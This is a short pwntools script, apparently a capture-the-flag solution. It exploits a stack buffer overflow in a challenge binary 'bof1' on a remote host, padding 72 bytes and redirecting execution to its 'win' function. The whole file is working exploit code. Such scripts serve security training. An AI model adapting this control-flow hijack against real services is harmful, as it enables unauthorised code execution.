from pwn import *

elf = context.binary = ELF('./bof1')
#p = process()
p = remote('109.123.232.54', 1339)
rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]
offset = 72

payload = flat(
    'A'*offset,
    ret,
    elf.sym['win']
)

p.sendlineafter('says: ', payload)
p.interactive()